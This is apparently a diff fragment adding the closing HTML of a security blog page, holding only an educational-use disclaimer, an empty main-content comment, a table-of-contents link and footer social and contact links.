+<p><small> Disclaimer: This blog post is intended for educational and research purposes only. All techniques and code examples are provided to help defenders understand offensive tradecraft and improve security posture. Do not use this information to access or interfere with systems you do not own or have explicit permission to test. Unauthorized use may violate laws and ethical guidelines. The author assumes no responsibility for any misuse or damage resulting from applying the concepts discussed. </small></p>
+<!-- Main Content -->
+
+<!-- Subtle Back to ToC link at the bottom -->
+<hr>
+
+<p style="text-align: left; font-size: 14px; margin-top: 10px;">
+    <a href="https://infosecfacts.github.io/index.html" style="color: #666; text-decoration: none;">← Back to Table of Contents</a>
+</p>
+
+<!-- Footer Links -->
+<hr>
+<p style="text-align: center; font-size: 14px; color: #666;">
+    <a href="https://www.instagram.com/infosecfacts/" target="_blank">Instagram</a> |
+    <a href="https://github.com/infosecfacts" target="_blank">GitHub</a> |
+    <span id="email-link"><a href="mailto:infosecfactsblog@gmail.com">Contact</a></span>
+</p>
+
+
+</body></html>
